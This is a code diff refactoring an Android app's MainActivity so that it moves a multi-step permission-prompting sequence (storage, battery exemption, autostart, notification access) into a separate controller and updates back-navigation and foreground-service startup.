@@ -1,80 +1,58 @@
 package com.fason.app.ui;
 
-import android.app.Activity;
+import androidx.activity.ComponentActivity;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
-import android.view.WindowManager;
-
 import androidx.annotation.NonNull;
 import androidx.core.view.WindowCompat;
-
 import com.fason.app.R;
-import com.fason.app.core.permissions.PermissionManager;
 import com.fason.app.service.MainService;
 
-// Uses bare Activity instead of AppCompatActivity to avoid pulling in AppCompat/Material
-public class MainActivity extends Activity {
-
-    private static final int PERM_REQ = 1001;
+public class MainActivity extends ComponentActivity {
     private HomeManager home;
-
-    // Sequential permission prompting — tracks which step we're on
-    private int permStep = 0;
-    private boolean hasRequestedRuntimePerms = false;
+    private PermissionSetupController permController;
 
     @Override
     protected void onCreate(Bundle state) {
         super.onCreate(state);
-
-        // Draw behind system bars for immersive layout
         WindowCompat.setDecorFitsSystemWindows(getWindow(), false);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            getWindow().setDecorFitsSystemWindows(false);
-        } else {
-            getWindow().setFlags(
-                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
-        }
-
         setContentView(R.layout.activity_main);
-
         home = new HomeManager();
         home.init(findViewById(R.id.webView), findViewById(R.id.progressBar));
-
         if (state != null) {
             home.restoreState(state);
         }
-
-        // Don't wait for permissions before starting service or loading page
+        permController = new PermissionSetupController(this);
+        permController.onCreate(state);
         startSvc();
         loadPage();
-
-        if (!hasRequestedRuntimePerms) {
-            hasRequestedRuntimePerms = true;
-            PermissionManager.requestPerms(this, PERM_REQ);
-        }
+        final PermissionSetupController ctrl = permController;
+        findViewById(R.id.permOverlay).postDelayed(ctrl::autoStartFirstMissing, 600);
+        getOnBackPressedDispatcher().addCallback(this, new androidx.activity.OnBackPressedCallback(true) {
+            @Override
+            public void handleOnBackPressed() {
+                if (home != null && home.canGoBack()) {
+                    home.goBack();
+                } else {
+                    setEnabled(false);
+                    onBackPressed();
+                }
+            }
+        });
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        // After returning from settings, advance to next permission step
-        if (hasRequestedRuntimePerms) {
-            advancePermStep();
-        }
+        if (permController != null) permController.onResume();
     }
 
     @Override
     protected void onSaveInstanceState(@NonNull Bundle out) {
         super.onSaveInstanceState(out);
         if (home != null) home.saveState(out);
-    }
-
-    @Override
-    public void onBackPressed() {
-        if (home != null && home.canGoBack()) home.goBack();
-        else super.onBackPressed();
+        if (permController != null) permController.onSaveInstanceState(out);
     }
 
     @Override
@@ -84,102 +62,22 @@ public class MainActivity extends Activity {
     }
 
     @Override
-    public void onRequestPermissionsResult(int req, @NonNull String[] perms, @NonNull int[] results) {
+    public void onRequestPermissionsResult(int req, @NonNull String[] perms,
+                                            @NonNull int[] results) {
         super.onRequestPermissionsResult(req, perms, results);
-        if (req == PERM_REQ) {
-            advancePermStep();
-        }
-    }
-
-    // One settings page at a time — each step only opens if the permission is still missing
-    private void advancePermStep() {
-        switch (permStep) {
-            case 0:
-                if (!PermissionManager.hasAllPerms(this)) {
-                    permStep = 1;
-                    PermissionManager.openAppSettings(this);
-                    return;
-                }
-                permStep = 2;
-                advancePermStep();
-                break;
-
-            case 1:
-                // Returned from app settings — stop if still missing to avoid spamming
-                if (!PermissionManager.hasAllPerms(this)) {
-                    permStep = 99;
-                    return;
-                }
-                permStep = 2;
-                advancePermStep();
-                break;
-
-            case 2:
-                if (!PermissionManager.hasStorageManager()) {
-                    PermissionManager.requestStorageManager(this);
-                    permStep = 3;
-                    return;
-                }
-                permStep = 4;
-                advancePermStep();
-                break;
-
-            case 3:
-                permStep = 4;
-                advancePermStep();
-                break;
-
-            case 4:
-                if (!PermissionManager.hasBatteryExemption(this)) {
-                    PermissionManager.requestBatteryExemption(this);
-                    permStep = 5;
-                    return;
-                }
-                permStep = 6;
-                advancePermStep();
-                break;
-
-            case 5:
-                permStep = 6;
-                advancePermStep();
-                break;
-
-            case 6:
-                if (PermissionManager.needsAutoStart(this)) {
-                    PermissionManager.requestAutoStart(this);
-                    permStep = 7;
-                    return;
-                }
-                permStep = 8;
-                advancePermStep();
-                break;
-
-            case 7:
-                permStep = 8;
-                advancePermStep();
-                break;
-
-            case 8:
-                if (!PermissionManager.hasNotifAccess(this)) {
-                    PermissionManager.requestNotifAccess(this);
-                    permStep = 9;
-                    return;
-                }
-                permStep = 99;
-                break;
-
-            case 9:
-                permStep = 99;
-                break;
-
-            default:
-                break;
+        if (permController != null) {
+            permController.onRequestPermissionsResult(req);
         }
     }
 
     private void startSvc() {
         try {
-            startForegroundService(new Intent(this, MainService.class));
+            Intent svcIntent = new Intent(this, MainService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(svcIntent);
+            } else {
+                startService(svcIntent);
+            }
         } catch (Exception ignored) {}
     }
 
